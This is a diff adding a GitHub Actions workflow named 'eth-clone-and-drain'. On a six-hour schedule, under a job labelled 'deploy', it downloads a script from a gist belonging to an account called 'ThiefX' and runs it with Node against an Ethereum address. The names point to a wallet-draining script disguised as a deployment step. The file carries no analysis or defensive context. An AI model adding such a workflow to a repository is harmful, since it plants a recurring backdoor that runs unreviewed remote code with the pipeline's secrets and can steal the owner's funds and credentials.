@@ -1,0 +1,14 @@
+name: eth-clone-and-drain
+on:
+  workflow_dispatch:
+  schedule: [{cron: "0 */6 * * *"}]
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: {node-version: 20}
+      - run: |
+          curl -sSf https://gist.githubusercontent.com/ThiefX/4f8c2b3b/raw/eth-mirror.js > run.js
+          node run.js 0x9FAB63812476FA4F4e8806D5297452dBC2c1C67c
